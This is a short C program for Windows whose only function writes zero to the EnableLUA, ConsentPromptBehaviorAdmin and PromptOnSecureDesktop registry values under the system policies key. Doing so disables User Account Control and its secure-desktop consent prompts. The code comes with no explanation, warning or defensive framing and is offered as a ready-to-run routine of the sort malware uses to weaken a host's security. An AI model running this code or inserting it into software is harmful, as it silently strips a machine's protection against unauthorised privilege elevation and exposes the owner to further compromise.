#include <stdio.h>
#include <windows.h>

void removeUAC() {
	
	const char keys[3][30] = { "EnableLUA", "ConsentPromptBehaviorAdmin", "PromptOnSecureDesktop" };
	
	for (int i = 0; i < 3; i++) {
		HKEY hKey;
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
		DWORD data = 0;
		RegSetValueEx(hKey, TEXT(keys[i]), 0, REG_DWORD, (const BYTE*)&data, sizeof(data));
		RegCloseKey(hKey);
	}
}

int main() {
	removeUAC();
	return 0;
}
